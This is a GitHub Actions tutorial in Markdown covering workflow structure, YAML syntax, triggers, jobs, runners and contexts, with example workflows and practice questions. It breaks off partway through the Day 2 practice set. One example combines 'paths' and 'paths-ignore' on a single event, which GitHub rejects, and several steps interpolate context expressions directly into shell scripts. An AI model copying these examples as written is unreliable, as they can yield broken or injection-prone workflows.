# 🚀 GitHub Actions — 6-Day Production Mastery Guide
> **Trainer**: 17 Years GitHub Actions & DevOps Experience  
> **Goal**: Make you production-ready in 6 days  
> **Format**: Concept → Deep Explanation → Real Example → 10 Practice Problems

---

## 📅 STUDY PLAN OVERVIEW

| Day | Theme | Topics |
|-----|-------|--------|
| **Day 1** | Foundations | Intro, YAML, Workflow Structure, Triggers |
| **Day 2** | Core Mechanics | Jobs, Steps, Runners, Contexts, Expressions |
| **Day 3** | Power Features | Matrix, Caching, Artifacts, Secrets, Environments |
| **Day 4** | CI/CD Pipelines | Build, Test, Docker, Deploy Strategies |
| **Day 5** | Production Patterns | OIDC, Security, Self-hosted Runners, Notifications |
| **Day 6** | Custom Actions & Mastery | Composite Actions, JS Actions, Reusable Workflows, Projects |

---

---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DAY 1 — FOUNDATIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

---

## TOPIC 1.1 — What is GitHub Actions?

### 📖 Explanation

GitHub Actions is a **CI/CD (Continuous Integration / Continuous Deployment) platform** built directly into GitHub. It lets you automate workflows that run in response to events in your repository — like pushing code, opening a pull request, creating a tag, or even on a schedule.

Think of it like this:
- You write a **recipe** (workflow YAML file)
- GitHub **cooks it** (runs it on a virtual machine called a runner)
- Every time a **trigger event** fires (e.g., push to main), the recipe executes automatically

**Why GitHub Actions over Jenkins, CircleCI, etc.?**
- Native GitHub integration — no webhook setup needed
- Free tier for public repos (2,000 min/month for private)
- 20,000+ community-built actions in the Marketplace
- YAML-based, version-controlled with your code
- Matrix builds, reusable workflows, and OIDC out-of-the-box

### Key Vocabulary

| Term | Meaning |
|------|---------|
| **Workflow** | A YAML file that defines automation logic |
| **Event/Trigger** | What starts the workflow (push, PR, schedule) |
| **Job** | A group of steps that run on the same runner |
| **Step** | A single task inside a job (run a command or use an action) |
| **Action** | A reusable unit of code (from Marketplace or custom) |
| **Runner** | The virtual machine that executes your jobs |
| **Artifact** | Files saved from a workflow run (build output, test reports) |
| **Secret** | Encrypted value stored in GitHub, injected at runtime |

### Where Workflows Live

All workflows go inside:
```
your-repo/
└── .github/
    └── workflows/
        ├── ci.yml
        ├── deploy.yml
        └── release.yml
```

---

### ✅ EXAMPLE 1.1 — Your First Workflow

```yaml
# .github/workflows/hello-world.yml

name: Hello World Workflow          # Display name in GitHub UI

on:                                  # TRIGGER: when to run this
  push:                              # Run on every push
    branches:
      - main                         # Only when pushing to 'main'

jobs:                                # Define jobs
  greet:                             # Job ID (can be anything)
    name: Say Hello                  # Display name in UI
    runs-on: ubuntu-latest           # Runner: GitHub-hosted Ubuntu VM

    steps:                           # List of steps inside this job
      - name: Print Hello            # Step display name
        run: echo "Hello, GitHub Actions! 🚀"   # Shell command

      - name: Show date and time
        run: date

      - name: Show current directory
        run: pwd && ls -la
```

**What happens when you push this?**
1. GitHub detects a push to `main`
2. Spins up a fresh Ubuntu 22.04 VM
3. Runs each step in sequence
4. You see results in the "Actions" tab of your repo

---

### 🏋️ PRACTICE SET 1.1 — 10 Questions

**Instructions**: Create these as real `.github/workflows/` files in a test repo.

1. **[Beginner]** Create a workflow that triggers on push to any branch and prints `"CI started!"` followed by the runner's OS info using `uname -a`.

2. **[Beginner]** Create a workflow named `"System Info"` that runs on push to `main` and prints: current user (`whoami`), hostname, available memory (`free -h`), and disk space (`df -h`).

3. **[Beginner]** Write a workflow that runs when a pull request is opened or synchronized (use `on: pull_request: types: [opened, synchronize]`). It should print `"PR received — running checks!"`.

4. **[Intermediate]** Create a workflow with **two jobs**: `job-a` prints "I am Job A" and `job-b` prints "I am Job B". Observe that they run in parallel. What order do they complete in?

5. **[Intermediate]** Create a workflow triggered on `push` to branches `main` OR `develop`. Add a step that runs `echo "Branch: $GITHUB_REF"` to print which branch triggered it.

6. **[Intermediate]** Add a step that **intentionally fails** (`exit 1`) and observe what happens to subsequent steps. Then add `continue-on-error: true` to that step and see the difference.

7. **[Intermediate]** Create a workflow that triggers on **both** `push` and `pull_request`. Add a step that prints `"Triggered by: ${{ github.event_name }}"` to show which event fired.

8. **[Advanced]** Create a workflow with a `workflow_dispatch` trigger (manual trigger from GitHub UI). Add an **input parameter** called `environment` with options `staging` and `production`. Print `"Deploying to: ${{ inputs.environment }}"`.

9. **[Advanced]** Create a workflow that runs on `schedule` using cron syntax — make it run **every day at 9:00 AM UTC** (Monday to Friday). It should print a "Good morning, team!" message.

10. **[Production Scenario]** Your team wants a nightly health check. Create a workflow that: runs at midnight UTC every day, prints the current timestamp, checks if a mock URL responds (`curl -I https://github.com`), and prints `"Health check passed"` or fails with `exit 1` if curl returns non-zero.

---
---

## TOPIC 1.2 — YAML Syntax for GitHub Actions

### 📖 Explanation

GitHub Actions workflows are written in **YAML** (YAML Ain't Markup Language). YAML is indentation-sensitive — wrong indentation = broken workflow.

**Core YAML Rules:**
```yaml
# Comments start with hash

# Strings — quotes are optional unless special chars
name: My Workflow
name: "My Workflow"     # Same thing

# Booleans
enabled: true
disabled: false

# Numbers
timeout-minutes: 30

# Lists (arrays) — two styles
branches:
  - main
  - develop
# OR inline:
branches: [main, develop]

# Dictionaries (key-value maps)
env:
  APP_NAME: myapp
  PORT: 3000

# Multi-line strings
run: |
  echo "line 1"
  echo "line 2"
  echo "line 3"

# Single line (newlines become spaces)
run: >
  echo "this is
  all one line"
```

**Indentation Rules:**
- Use **spaces** (NOT tabs)
- Typically 2 spaces per level
- Lists use `- ` (dash space)

**Common Mistakes:**
```yaml
# ❌ WRONG — tab used
jobs:
	build:        # TAB — will fail!

# ✅ CORRECT — spaces
jobs:
  build:          # 2 spaces

# ❌ WRONG — inconsistent indent
steps:
  - name: Step 1
      run: echo hi    # 6 spaces — wrong level

# ✅ CORRECT
steps:
  - name: Step 1
    run: echo hi      # 4 spaces (2 for list item + 2 for key)
```

**GitHub Actions Specific Syntax:**
```yaml
# Expression syntax — double curly braces
${{ github.actor }}
${{ secrets.MY_SECRET }}
${{ env.MY_VAR }}

# Multiline run with pipe
run: |
  npm install
  npm test
  npm run build

# Using an action from Marketplace
uses: actions/checkout@v4

# Action with parameters
uses: actions/setup-node@v4
with:
  node-version: '20'
```

---

### ✅ EXAMPLE 1.2 — YAML with All Common Patterns

```yaml
# .github/workflows/yaml-patterns.yml

name: YAML Patterns Demo

on:
  push:
    branches: [main, develop, 'feature/**']
  pull_request:
    types: [opened, synchronize, reopened]
  schedule:
    - cron: '0 9 * * 1-5'   # 9 AM UTC, Mon-Fri
  workflow_dispatch:
    inputs:
      log_level:
        description: 'Log verbosity'
        required: true
        default: 'info'
        type: choice
        options: [debug, info, warn, error]

env:                          # Workflow-level env vars
  APP_NAME: my-app
  NODE_ENV: production

jobs:
  demo:
    runs-on: ubuntu-latest
    timeout-minutes: 10       # Kill job if it runs > 10 min

    env:                      # Job-level env vars (override workflow)
      PORT: 3000

    steps:
      - name: Multi-line script
        run: |
          echo "App: $APP_NAME"
          echo "Port: $PORT"
          echo "Node env: $NODE_ENV"
          echo "Log level: ${{ inputs.log_level }}"

      - name: Folded scalar (single line)
        run: >
          echo "This entire block
          runs as one line"

      - name: Conditional step
        if: github.ref == 'refs/heads/main'
        run: echo "This only runs on main branch"

      - name: Use an action
        uses: actions/checkout@v4
        with:
          fetch-depth: 0      # Fetch full git history
```

---

### 🏋️ PRACTICE SET 1.2 — 10 Questions

1. **[Beginner]** Write a workflow YAML where `env` block is defined at workflow level with `COMPANY=Acme` and `VERSION=1.0`. Print both in a step.

2. **[Beginner]** Create a workflow with a `run` step using `|` (block scalar) that runs 5 commands: install curl, check curl version, ping google DNS, print date, print pwd.

3. **[Beginner]** What is the difference between `|` and `>` in YAML `run` blocks? Create a workflow demonstrating both and explain output differences in comments.

4. **[Intermediate]** Create a workflow with a `workflow_dispatch` trigger that has 3 inputs: `app_name` (string, required), `replicas` (number, default 2), and `debug_mode` (boolean). Print all three in a step.

5. **[Intermediate]** Create a YAML workflow that triggers on pushes to branches matching the pattern `release/**` (using glob). Print `"Release branch detected"`.

6. **[Intermediate]** Write a workflow that has both workflow-level `env` and job-level `env`, where the job-level overrides `NODE_ENV` to `test`. Prove the override works by printing the variable.

7. **[Intermediate]** Create a workflow where one step uses `if: github.event_name == 'schedule'` and another uses `if: github.event_name == 'workflow_dispatch'`. Trigger both and see which steps run.

8. **[Advanced]** Create a workflow with `timeout-minutes: 5` at the job level. Add a step that runs `sleep 400` (which exceeds timeout). Observe the job being killed. Then move `timeout-minutes: 2` to the step level instead.

9. **[Advanced]** Create a YAML file with complex `on:` block that: triggers on push to `main` and `develop`, ignores pushes that ONLY change files in `docs/**` folder (using `paths-ignore`), triggers on PRs to `main`, and allows manual dispatch.

10. **[Production Scenario]** Your monorepo has 3 services: `frontend/`, `backend/`, `infra/`. Create a workflow with `paths` filters so it only runs when files change under the relevant service directory. Use `on.push.paths` with patterns like `frontend/**`.

---
---

## TOPIC 1.3 — Workflow Triggers (Events)

### 📖 Explanation

Triggers define **when** a workflow runs. GitHub supports 35+ event types. Here are the most important ones in production:

#### Category 1: Code Events
```yaml
on:
  push:
    branches: [main, develop]
    tags: ['v*']              # Triggers on version tags like v1.0.0
    paths:                    # Only if these paths changed
      - 'src/**'
      - 'package.json'
    paths-ignore:             # Exclude these paths
      - 'docs/**'
      - '**.md'

  pull_request:
    types:                    # PR activity types
      - opened
      - synchronize           # New commits pushed to PR
      - reopened
      - closed                # PR closed (merged or not)
    branches: [main]          # Only PRs targeting main
```

#### Category 2: Manual & Scheduled
```yaml
on:
  workflow_dispatch:          # Manual trigger from UI or API
    inputs:
      environment:
        description: 'Target environment'
        type: choice
        options: [dev, staging, prod]
        required: true

  schedule:
    - cron: '0 2 * * *'       # Every day at 2 AM UTC
    - cron: '0 8 * * 1'       # Every Monday at 8 AM UTC
```

#### Category 3: Repository Events
```yaml
on:
  release:
    types: [published]        # When a GitHub Release is published

  issues:
    types: [opened, labeled]

  issue_comment:
    types: [created]

  create:                     # Branch or tag created
  delete:                     # Branch or tag deleted
```

#### Category 4: Workflow-to-Workflow
```yaml
on:
  workflow_run:               # Triggers after another workflow runs
    workflows: ["CI Build"]   # Name of the other workflow
    types: [completed]
    branches: [main]

  workflow_call:              # Makes this a reusable workflow
    inputs:
      environment:
        type: string
        required: true
    secrets:
      deploy_key:
        required: true
```

#### Cron Syntax Cheat Sheet
```
┌──── minute (0-59)
│  ┌──── hour (0-23)
│  │  ┌──── day of month (1-31)
│  │  │  ┌──── month (1-12)
│  │  │  │  ┌──── day of week (0-6, 0=Sunday)
│  │  │  │  │
*  *  *  *  *

Examples:
0 0 * * *       → Midnight every day
0 9 * * 1-5    → 9 AM, Mon-Fri
*/15 * * * *   → Every 15 minutes
0 6 1 * *      → 6 AM on 1st of every month
0 0 * * 0      → Midnight every Sunday
```

**⚠️ Important**: GitHub may delay scheduled workflows by up to 15 minutes under high load. Never rely on exact timing for critical operations.

---

### ✅ EXAMPLE 1.3 — Production Trigger Patterns

```yaml
# .github/workflows/production-triggers.yml

name: Production CI/CD Triggers

on:
  # Auto-run on main and develop pushes
  push:
    branches:
      - main
      - develop
    paths:
      - 'src/**'
      - 'tests/**'
      - 'package*.json'
      - 'Dockerfile'
    paths-ignore:
      - '**.md'
      - '.github/ISSUE_TEMPLATE/**'

  # Run on PRs targeting main
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

  # Allow manual deploy with target selection
  workflow_dispatch:
    inputs:
      target:
        description: 'Deploy target'
        required: true
        type: choice
        options: [staging, production]
      skip_tests:
        description: 'Skip tests?'
        type: boolean
        default: false

  # Nightly full test suite
  schedule:
    - cron: '0 2 * * *'

  # On GitHub Release published → deploy to prod
  release:
    types: [published]

jobs:
  detect-trigger:
    runs-on: ubuntu-latest
    steps:
      - name: Show trigger context
        run: |
          echo "Event: ${{ github.event_name }}"
          echo "Ref: ${{ github.ref }}"
          echo "Actor: ${{ github.actor }}"
          echo "SHA: ${{ github.sha }}"

      - name: Release-specific step
        if: github.event_name == 'release'
        run: echo "🎉 New release: ${{ github.event.release.tag_name }}"

      - name: Manual deploy step
        if: github.event_name == 'workflow_dispatch'
        run: echo "🚀 Manual deploy to ${{ inputs.target }}"

      - name: Skip tests check
        if: |
          github.event_name == 'workflow_dispatch' &&
          inputs.skip_tests == 'true'
        run: echo "⚠️ Tests skipped!"
```

---

### 🏋️ PRACTICE SET 1.3 — 10 Questions

1. **[Beginner]** Create a workflow triggered only when pushing a **tag** matching pattern `v*.*.*` (semantic version). Print `"New release tag pushed: ${{ github.ref }}"`.

2. **[Beginner]** Create a workflow that fires on `pull_request` but only when the PR is **closed** (`types: [closed]`). Inside the job, check `if: github.event.pull_request.merged == true` to distinguish merge from close-without-merge.

3. **[Beginner]** Create a schedule workflow that runs every 6 hours. Print the current timestamp in UTC using `date -u`.

4. **[Intermediate]** Create a workflow triggered on push to `main` that has two path filters: one workflow for `frontend/**` changes and another for `backend/**` changes. Each should print which service changed.

5. **[Intermediate]** Create a `workflow_dispatch` triggered workflow with input `dry_run` (boolean). If `dry_run` is true, print `"DRY RUN — no changes will be made"`. If false, print `"LIVE RUN — changes will be applied"`.

6. **[Intermediate]** Create a workflow triggered by `issue_comment` that only runs when a comment contains `/deploy` text. (Hint: use `if: contains(github.event.comment.body, '/deploy')`). Print who triggered it and what they said.

7. **[Intermediate]** Create a `release` event workflow that: runs when a release is **published**, extracts the tag name and release body, prints them, and then prints `"Draft: ${{ github.event.release.draft }}"`.

8. **[Advanced]** Create a workflow that triggers via `workflow_run` after a workflow called `"Unit Tests"` completes successfully. Use `if: github.event.workflow_run.conclusion == 'success'` to gate a deploy step.

9. **[Advanced]** Create a workflow triggered on push to `main` that uses the `concurrency` key to cancel in-progress runs of the same workflow (`cancel-in-progress: true`). This prevents multiple deploys from racing.

10. **[Production Scenario]** Your team follows trunk-based development. Create a complete trigger strategy:
    - Feature branches → run linting only
    - `main` → run full CI (lint + test + build)
    - Tags `v*` → run CI + deploy to production
    - Scheduled nightly → run integration tests only
    Use `github.ref` and `github.event_name` to control which jobs run.

---
---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DAY 2 — CORE MECHANICS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

---

## TOPIC 2.1 — Jobs, Steps, and Dependencies

### 📖 Explanation

#### Jobs
A **job** is a unit of work that runs on a single runner. By default, all jobs run **in parallel**. To create dependencies:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building..."

  test:
    needs: build              # Test waits for build to finish
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing..."

  deploy:
    needs: [build, test]      # Deploy waits for BOTH
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

**Job execution flow:**
```
build ─────────────────────────┐
                               ▼
lint ──────────────────────► test ──► deploy
                               ▲
security-scan ─────────────────┘
```

#### Steps
Steps run **sequentially** within a job. There are two types:
1. `run` — executes shell commands
2. `uses` — uses a GitHub Action

```yaml
steps:
  # Type 1: Shell command
  - name: Install dependencies
    run: npm install

  # Type 2: Action
  - name: Checkout code
    uses: actions/checkout@v4

  # Type 2: Action with parameters
  - name: Setup Node.js
    uses: actions/setup-node@v4
    with:
      node-version: '20'
      cache: 'npm'

  # Conditional step
  - name: Deploy (only on main)
    if: github.ref == 'refs/heads/main'
    run: ./deploy.sh

  # Step with env override
  - name: Run tests
    env:
      DATABASE_URL: ${{ secrets.TEST_DB_URL }}
    run: npm test

  # Continue even if this step fails
  - name: Optional lint check
    continue-on-error: true
    run: npm run lint
```

#### Step Outputs
Steps can produce outputs that other steps consume:

```yaml
steps:
  - name: Generate version
    id: version                    # Give step an ID
    run: echo "tag=v1.2.3" >> $GITHUB_OUTPUT

  - name: Use version
    run: echo "Deploying ${{ steps.version.outputs.tag }}"
```

#### Job Outputs
Jobs can pass data to dependent jobs:

```yaml
jobs:
  compute:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.get-version.outputs.tag }}
    steps:
      - id: get-version
        run: echo "tag=$(git describe --tags)" >> $GITHUB_OUTPUT

  deploy:
    needs: compute
    runs-on: ubuntu-latest
    steps:
      - run: echo "Version is ${{ needs.compute.outputs.version }}"
```

---

### ✅ EXAMPLE 2.1 — Full Job Pipeline with Dependencies

```yaml
# .github/workflows/job-pipeline.yml

name: CI Pipeline with Dependencies

on:
  push:
    branches: [main]

jobs:
  # Job 1: Lint
  lint:
    name: 🔍 Lint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run ESLint (simulated)
        run: |
          echo "Running linter..."
          echo "No lint errors found ✅"

  # Job 2: Unit Tests
  unit-test:
    name: 🧪 Unit Tests
    runs-on: ubuntu-latest
    needs: lint                  # Wait for lint to pass
    outputs:
      test_count: ${{ steps.run-tests.outputs.count }}
    steps:
      - uses: actions/checkout@v4
      - id: run-tests
        name: Run tests
        run: |
          echo "Running 47 tests..."
          echo "count=47" >> $GITHUB_OUTPUT
          echo "All 47 tests passed ✅"

  # Job 3: Security Scan (parallel with tests)
  security:
    name: 🔒 Security Scan
    runs-on: ubuntu-latest
    needs: lint                  # Also needs lint, runs parallel to tests
    steps:
      - uses: actions/checkout@v4
      - name: Run security scan
        run: |
          echo "Scanning for vulnerabilities..."
          echo "No critical vulnerabilities ✅"

  # Job 4: Build (after tests + security)
  build:
    name: 🔨 Build
    runs-on: ubuntu-latest
    needs: [unit-test, security]
    outputs:
      image_tag: ${{ steps.set-tag.outputs.tag }}
    steps:
      - uses: actions/checkout@v4
      - id: set-tag
        run: |
          TAG="sha-${{ github.sha }}"
          echo "tag=$TAG" >> $GITHUB_OUTPUT
          echo "Build tag: $TAG"

      - name: Show test count from upstream
        run: echo "Built after ${{ needs.unit-test.outputs.test_count }} tests passed"

  # Job 5: Deploy (after build, only on main)
  deploy:
    name: 🚀 Deploy
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy image
        run: |
          echo "Deploying image: ${{ needs.build.outputs.image_tag }}"
          echo "✅ Deployed successfully!"
```

---

### 🏋️ PRACTICE SET 2.1 — 10 Questions

1. **[Beginner]** Create a workflow with 3 jobs: `job-a`, `job-b`, `job-c`. Make them run in sequence (each `needs` the previous). Each job should print its name and the time it started.

2. **[Beginner]** Create a workflow where `job-a` and `job-b` run in parallel, and `job-c` runs only after BOTH complete. Verify by looking at the execution graph in the GitHub Actions UI.

3. **[Beginner]** Create a step with `id: get-sha` that writes `sha=${{ github.sha }}` to `$GITHUB_OUTPUT`. In the next step, reference this output and print `"Current SHA is: <output>"`.

4. **[Intermediate]** Create a job `compute-version` that outputs a version string. Create a downstream job `use-version` (with `needs: compute-version`) that accesses that output via `needs.compute-version.outputs.version`.

5. **[Intermediate]** Create a workflow with a step that fails (`exit 1`). Add `if: failure()` to the next step so it only runs when the previous step fails. Use this to simulate an alert/notification pattern.

6. **[Intermediate]** Create a workflow where job `build` succeeds but job `test` fails. Create job `notify` that runs `if: always()` and prints either "CI passed" or "CI failed" based on job statuses.

7. **[Intermediate]** Create a step that sets multiple outputs: `version`, `environment`, `timestamp`. Access all three in subsequent steps.

8. **[Advanced]** Create a complex fan-out / fan-in pipeline:
   - `setup` generates a build ID
   - `test-unit`, `test-integration`, `test-e2e` all run in parallel (needs setup)
   - `report` aggregates all results (needs all 3 test jobs)
   - `report` should print "All tests done" with the build ID from setup

9. **[Advanced]** Create a job that runs `if: needs.build.result == 'success' && github.ref == 'refs/heads/main'`. Explore how to combine job result conditions with event conditions.

10. **[Production Scenario]** Design a realistic microservices CI pipeline with these jobs:
    - `detect-changes`: Uses git diff to output which services changed
    - `build-frontend`: Only runs if frontend changed
    - `build-backend`: Only runs if backend changed  
    - `integration-test`: Runs after both builds (or whichever ran)
    - `deploy`: Only on main, after integration-test

---
---

## TOPIC 2.2 — Runners (Hosted & Self-Hosted)

### 📖 Explanation

A **runner** is the machine that executes your workflow jobs. GitHub offers two types:

#### GitHub-Hosted Runners

| Label | OS | Specs |
|-------|----|-------|
| `ubuntu-latest` | Ubuntu 22.04 | 2 CPU, 7 GB RAM, 14 GB SSD |
| `ubuntu-22.04` | Ubuntu 22.04 | 2 CPU, 7 GB RAM |
| `ubuntu-20.04` | Ubuntu 20.04 | 2 CPU, 7 GB RAM |
| `windows-latest` | Windows Server 2022 | 2 CPU, 7 GB RAM |
| `macos-latest` | macOS 14 (Sonoma) | 3 CPU, 14 GB RAM |
| `macos-13` | macOS 13 (Ventura) | 3 CPU, 14 GB RAM |

**What's pre-installed on ubuntu-latest?**
- Docker, Docker Compose
- Node.js, Python, Ruby, Java, Go, .NET
- AWS CLI, Azure CLI, GCloud CLI
- git, curl, wget, jq, zip, make, cmake
- Terraform, Ansible, Helm, kubectl

**Larger Runners** (paid):
```yaml
runs-on: ubuntu-latest-4-cores      # 4 CPU, 16 GB RAM
runs-on: ubuntu-latest-8-cores      # 8 CPU, 32 GB RAM
runs-on: ubuntu-latest-16-cores     # 16 CPU, 64 GB RAM
```

#### Self-Hosted Runners

Use self-hosted runners when you need:
- Private network access (internal databases, APIs)
- Custom hardware (GPUs, specific OS)
- Cost savings for high usage (>2000 min/month)
- Larger disk or memory

```yaml
# Use self-hosted runner
runs-on: self-hosted

# Use self-hosted with labels
runs-on: [self-hosted, linux, x64, gpu]

# Use self-hosted with specific environment
runs-on: [self-hosted, production, high-memory]
```

**Setting up a self-hosted runner:**
```bash
# On your server:
mkdir actions-runner && cd actions-runner
# Download runner package from GitHub UI:
# Settings > Actions > Runners > New self-hosted runner
curl -o actions-runner-linux-x64-2.319.0.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.319.0/...
tar xzf ./actions-runner-linux-x64-2.319.0.tar.gz
./config.sh --url https://github.com/YOUR_ORG/YOUR_REPO --token TOKEN
./run.sh

# Or run as a service:
sudo ./svc.sh install
sudo ./svc.sh start
```

#### Matrix Strategy (Multiple Runners)
```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - run: echo "Running on ${{ matrix.os }}"
```

---

### ✅ EXAMPLE 2.2 — Multi-OS Testing

```yaml
# .github/workflows/multi-os.yml

name: Cross-Platform Testing

on: [push]

jobs:
  test:
    name: Test on ${{ matrix.os }}
    strategy:
      fail-fast: false          # Don't cancel all if one fails
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        include:
          - os: ubuntu-latest
            shell: bash
            pkg_cmd: apt-get
          - os: windows-latest
            shell: powershell
            pkg_cmd: choco
          - os: macos-latest
            shell: bash
            pkg_cmd: brew

    runs-on: ${{ matrix.os }}

    steps:
      - uses: actions/checkout@v4

      - name: Show OS info
        run: |
          echo "Runner OS: ${{ matrix.os }}"
          echo "Package manager: ${{ matrix.pkg_cmd }}"

      - name: Check tools (bash)
        if: matrix.shell == 'bash'
        shell: bash
        run: |
          node --version
          python3 --version
          docker --version || echo "No Docker on macOS"

      - name: Check tools (PowerShell)
        if: matrix.shell == 'powershell'
        shell: powershell
        run: |
          node --version
          python --version
          Write-Host "Windows runner info"

      - name: Show disk space
        run: df -h || dir
```

---

### 🏋️ PRACTICE SET 2.2 — 10 Questions

1. **[Beginner]** Create a workflow that runs on `ubuntu-latest` and prints the pre-installed versions of: Node.js, Python, Java, Go, Docker.

2. **[Beginner]** Create a workflow that runs on `macos-latest` and prints the available Xcode version (`xcodebuild -version`), plus system info (`sw_vers`).

3. **[Beginner]** Create a workflow with two jobs: one on `ubuntu-latest` and one on `windows-latest`. Each should print the list of files in `/` (Linux) or `C:\` (Windows) and the current username.

4. **[Intermediate]** Create a matrix job that tests on `ubuntu-20.04`, `ubuntu-22.04`, and `ubuntu-latest`. Install `tree` using `apt-get` and run `tree /usr/bin | head -20`. Note version differences.

5. **[Intermediate]** Create a matrix strategy that combines `os` and `node-version` (e.g., Node 18 and 20 on both Ubuntu and macOS). That gives 4 combinations. Print `"Testing Node ${{ matrix.node-version }} on ${{ matrix.os }}"`.

6. **[Intermediate]** Create a matrix with `fail-fast: false` where one combination is intentionally set to fail (use `if` to exit 1 for a specific combination). Verify other combinations still complete.

7. **[Intermediate]** Use `matrix.include` to add extra variables to specific matrix entries. For `ubuntu-latest` add `docker: true`, for `macos-latest` add `docker: false`. Use `if: matrix.docker` to conditionally run Docker steps.

8. **[Advanced]** Create a matrix with `matrix.exclude` to skip `windows-latest` + `node-version: 18` combination (sometimes certain combos are known to fail). Print the remaining combinations.

9. **[Advanced]** Simulate a self-hosted runner scenario: create a job with `runs-on: [self-hosted, linux]`. Add `if: false` to prevent actual execution. Write a comment block in the YAML explaining what infra setup would be needed.

10. **[Production Scenario]** Your app must be tested on Node 18, 20, and 22 across Ubuntu and macOS (not Windows for now). The test suite takes 10 minutes. Design a matrix strategy that: tests all 6 combos in parallel, doesn't cancel all if one fails, uses `actions/setup-node@v4` to install the right Node version, and on `ubuntu-latest`+`Node 20` additionally runs a Docker-based integration test.

---
---

## TOPIC 2.3 — Contexts and Expressions

### 📖 Explanation

**Contexts** are objects containing information about the workflow run. Access them with `${{ context.property }}`.

#### Available Contexts

```yaml
# github context — repo and event info
${{ github.actor }}          # Who triggered it
${{ github.event_name }}     # push, pull_request, etc.
${{ github.ref }}            # refs/heads/main
${{ github.sha }}            # Full commit SHA
${{ github.repository }}     # owner/repo
${{ github.workspace }}      # /home/runner/work/repo/repo
${{ github.run_id }}         # Unique run ID
${{ github.run_number }}     # Incrementing run number
${{ github.server_url }}     # https://github.com
${{ github.api_url }}        # https://api.github.com

# env context — environment variables
${{ env.MY_VAR }}

# secrets context — encrypted secrets
${{ secrets.MY_SECRET }}
${{ secrets.GITHUB_TOKEN }}  # Auto-provided by GitHub

# inputs context — workflow_dispatch inputs
${{ inputs.environment }}

# steps context — step outputs
${{ steps.my-step-id.outputs.result }}
${{ steps.my-step-id.outcome }}    # success, failure, skipped

# needs context — upstream job outputs
${{ needs.build-job.outputs.version }}
${{ needs.build-job.result }}       # success, failure, etc.

# runner context — runner info
${{ runner.os }}             # Linux, Windows, macOS
${{ runner.arch }}           # X64, ARM64
${{ runner.temp }}           # Temp directory path

# job context
${{ job.status }}            # success, failure, cancelled

# matrix context
${{ matrix.os }}
${{ matrix.node-version }}
```

#### Expressions

```yaml
# Boolean operators
if: github.ref == 'refs/heads/main'
if: github.ref != 'refs/heads/main'
if: github.actor == 'dependabot[bot]'

# Logical operators
if: github.ref == 'refs/heads/main' && github.event_name == 'push'
if: github.event_name == 'push' || github.event_name == 'workflow_dispatch'

# Functions
if: contains(github.ref, 'release')
if: startsWith(github.ref, 'refs/tags/')
if: endsWith(github.actor, '[bot]')

# Job status functions
if: success()         # All previous steps succeeded
if: failure()         # Any previous step failed
if: always()          # Always runs
if: cancelled()       # Workflow was cancelled

# String operations
${{ format('Hello {0}!', github.actor) }}
${{ join(matrix.os, ', ') }}
${{ toJSON(github) }}        # Serialize context to JSON

# Ternary-like
${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}
```

---

### ✅ EXAMPLE 2.3 — Context & Expression Showcase

```yaml
# .github/workflows/contexts-demo.yml

name: Contexts and Expressions Demo

on:
  push:
    branches: [main, develop]
  pull_request:
  workflow_dispatch:
    inputs:
      env:
        type: choice
        options: [dev, staging, prod]
        default: dev

env:
  DEPLOY_ENV: ${{ inputs.env || 'dev' }}

jobs:
  context-demo:
    runs-on: ubuntu-latest
    steps:
      - name: GitHub Context
        run: |
          echo "Actor: ${{ github.actor }}"
          echo "Event: ${{ github.event_name }}"
          echo "Ref: ${{ github.ref }}"
          echo "SHA: ${{ github.sha }}"
          echo "Repo: ${{ github.repository }}"
          echo "Run #: ${{ github.run_number }}"
          echo "Workspace: ${{ github.workspace }}"

      - name: Runner Context
        run: |
          echo "OS: ${{ runner.os }}"
          echo "Arch: ${{ runner.arch }}"
          echo "Temp: ${{ runner.temp }}"

      - name: Environment Variable via context
        env:
          MY_VAR: "hello from env"
        run: echo "From context: ${{ env.MY_VAR }}"

      - name: Detect branch type
        id: branch-check
        run: |
          if [[ "${{ github.ref }}" == "refs/heads/main" ]]; then
            echo "type=main" >> $GITHUB_OUTPUT
          elif [[ "${{ github.ref }}" =~ refs/heads/release ]]; then
            echo "type=release" >> $GITHUB_OUTPUT
          else
            echo "type=feature" >> $GITHUB_OUTPUT
          fi

      - name: Use expression functions
        run: |
          echo "Is main: ${{ github.ref == 'refs/heads/main' }}"
          echo "Contains release: ${{ contains(github.ref, 'release') }}"
          echo "Starts with tags: ${{ startsWith(github.ref, 'refs/tags/') }}"
          echo "Branch type: ${{ steps.branch-check.outputs.type }}"
          echo "Formatted: ${{ format('Actor is {0} on {1}', github.actor, github.ref) }}"

      - name: Determine deploy environment
        run: |
          TARGET="${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}"
          echo "Would deploy to: $TARGET"

      - name: Dump full github context (debug)
        run: echo '${{ toJSON(github) }}'
```

---

### 🏋️ PRACTICE SET 2.3 — 10 Questions

1. **[Beginner]** Print the full `github` context using `toJSON(github)`. Identify and list 10 properties you find useful. Create a step that prints only those 10 properties.

2. **[Beginner]** Use `github.run_number` to create a build version string like `"Build #42 on 2024-01-15"`. Use `date` command for the date. Write this to `$GITHUB_OUTPUT` and reference it in the next step.

3. **[Beginner]** Create a step using `format()` function to build a Docker image tag: `${{ format('{0}/{1}:{2}', github.repository_owner, github.event.repository.name, github.sha) }}`.

4. **[Intermediate]** Create a conditional step that uses `startsWith(github.ref, 'refs/tags/v')` to detect version tags. If true, extract just the version number from the ref using shell string manipulation.

